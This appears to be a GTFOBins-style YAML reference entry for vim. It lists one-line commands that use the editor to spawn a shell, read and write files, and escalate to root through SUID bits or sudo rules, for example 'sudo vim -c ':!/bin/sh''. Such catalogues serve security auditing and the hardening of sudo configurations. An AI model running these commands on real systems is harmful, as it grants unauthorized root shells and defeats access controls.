---
functions:
  shell:
    - code: vim -c ':!/bin/sh'
    - code: |
        vim
        :set shell=/bin/sh
        :shell
    - description: This requires that vim is compiled with Python support.
      code: vim -c ':py import os;os.system("sh")'
  file-write:
    - code: |
        vim file_to_write
        iDATA
        ^[
        w
  file-read:
    - code: vim file_to_read
  suid:
    - code: ./vim -c ':!/bin/sh -p'
  sudo:
    - code: sudo vim -c ':!/bin/sh'
    - code: sudo vim -c ':py import os;os.system("sh")'
      description: This requires that vim is compiled with Python support.
---
